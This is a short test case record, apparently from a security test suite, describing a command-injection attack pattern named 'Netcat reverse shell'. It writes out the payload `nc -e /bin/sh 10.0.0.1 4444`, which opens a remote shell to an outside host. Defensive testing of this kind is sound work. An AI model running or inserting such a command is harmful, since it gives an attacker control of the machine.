name: test_e2e_with_logs[388_CMD_REVSH_002]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_002` |
| **Name** | Netcat reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `nc -e /bin/sh 10.0.0.1 4444`
